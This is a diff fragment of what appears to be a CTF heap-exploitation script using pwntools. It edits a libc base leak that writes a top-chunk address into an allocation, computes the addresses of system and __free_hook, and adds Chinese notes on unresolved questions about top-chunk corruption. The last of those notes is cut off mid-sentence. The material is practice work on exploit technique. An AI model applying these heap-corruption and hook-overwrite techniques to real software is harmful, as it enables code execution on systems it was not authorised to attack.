@@ -52,7 +52,8 @@ gdb.attach(io)
 add(6, 0x78, 'aaa\x80bbb')
 add(7,0x48,'emmm')
 
-libc_base = int(add(8,0x48,"12345"),16)- 4111520 #???????? this add modify top chunk addr ??
+libc_base = int(add(8,0x48,p64(top_addr)*2),16)- 4111520
+#libc_base = int(add(8,0x48,"123456"),16)- 4111520 #???????? this add modify top chunk addr ??
 libc = ELF("./mlibc")
 system_addr = libc_base + libc.symbols["system"]
 free_hook = libc_base + libc.symbols["__free_hook"]
@@ -74,3 +75,4 @@ io.interactive()
 
 # 待解决
 1. 为什么`libc_base = int(add(8,0x48,"12345"),16)- 4111520`会修改topchunk的指针？
+2. 为什么top chunk 
